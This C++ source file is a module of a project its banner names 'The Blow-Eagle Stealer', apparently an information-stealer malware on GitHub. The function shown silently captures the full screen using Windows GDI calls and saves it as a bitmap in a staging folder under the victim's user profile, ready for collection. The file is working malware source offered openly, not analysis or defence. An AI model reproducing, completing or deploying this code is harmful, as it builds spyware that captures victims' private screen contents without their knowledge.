/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/



#include "../targets.h"
#include "../../config/config.cpp"
#include  "../../helper/helper.h"
#include <tchar.h>

void images::Screenshot() 
{
    printf("shoot\n");

    try {
        std::string user = func::GetUser();

        std::string filename = std::string("C:/Users/") + user + config::path + std::string("/Images/screenshot.bmp");

        std::string dir = "C:/Users/" + user + config::path + "/Images";

        int r = _mkdir(dir.c_str());

        // Get the screen dimensions
        int screenWidth = 3840;
        int screenHeight = 2160;

        // Create a device context for the screen
        HDC screenDC = GetDC(NULL);

        // Create a compatible device context
        HDC memDC = CreateCompatibleDC(screenDC);

        // Create a compatible bitmap
        HBITMAP bitmap = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);

        // Select the bitmap into the device context
        HGDIOBJ oldBitmap = SelectObject(memDC, bitmap);

        // Copy the screen contents to the compatible bitmap
        BOOL result = BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);

        // Save the bitmap to a file
        if (result)
        {
            // Create a file and save the bitmap as a .bmp file
            std::wstring ws = std::wstring(filename.begin(), filename.end());
            LPCWSTR f = ws.c_str();
            HANDLE fileHandle = CreateFile(f, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (fileHandle != INVALID_HANDLE_VALUE)
            {
                BITMAPFILEHEADER fileHeader;
                BITMAPINFOHEADER infoHeader;

                // Fill the file header
                fileHeader.bfType = 0x4D42;
                fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (screenWidth * screenHeight * 4);
                fileHeader.bfReserved1 = 0;
                fileHeader.bfReserved2 = 0;
                fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

                // Fill the info header
                infoHeader.biSize = sizeof(BITMAPINFOHEADER);
                infoHeader.biWidth = screenWidth;
                infoHeader.biHeight = -screenHeight;  // Negative height to ensure top-down bitmap
                infoHeader.biPlanes = 1;
                infoHeader.biBitCount = 32;
                infoHeader.biCompression = BI_RGB;
                infoHeader.biSizeImage = 0;
                infoHeader.biXPelsPerMeter = 0;
                infoHeader.biYPelsPerMeter = 0;
                infoHeader.biClrUsed = 0;
                infoHeader.biClrImportant = 0;

                // Write the file header and info header to the file
                DWORD bytesWritten;
                WriteFile(fileHandle, &fileHeader, sizeof(BITMAPFILEHEADER), &bytesWritten, NULL);
                WriteFile(fileHandle, &infoHeader, sizeof(BITMAPINFOHEADER), &bytesWritten, NULL);

                // Write the bitmap data to the file
                BITMAPINFO bitmapInfo;
                bitmapInfo.bmiHeader = infoHeader;
                bitmapInfo.bmiColors[0] = { 0, 0, 0, 0 };

                GetDIBits(memDC, bitmap, 0, screenHeight, NULL, &bitmapInfo, DIB_RGB_COLORS);
                GetDIBits(memDC, bitmap, 0, screenHeight, NULL, &bitmapInfo, DIB_RGB_COLORS);

                BYTE* bitmapData = new BYTE[screenWidth * screenHeight * 4];
                GetDIBits(memDC, bitmap, 0, screenHeight, bitmapData, &bitmapInfo, DIB_RGB_COLORS);
                WriteFile(fileHandle, bitmapData, screenWidth * screenHeight * 4, &bytesWritten, NULL);

                // Close the file
                CloseHandle(fileHandle);

                // Clean up
                delete[] bitmapData;
            }
        }

        // Clean up
        SelectObject(memDC, oldBitmap);
        DeleteObject(bitmap);
        DeleteDC(memDC);
        ReleaseDC(NULL, screenDC);
    }
    catch (const char* error_message)
    {
        std::cout << error_message << std::endl;
    }
   
}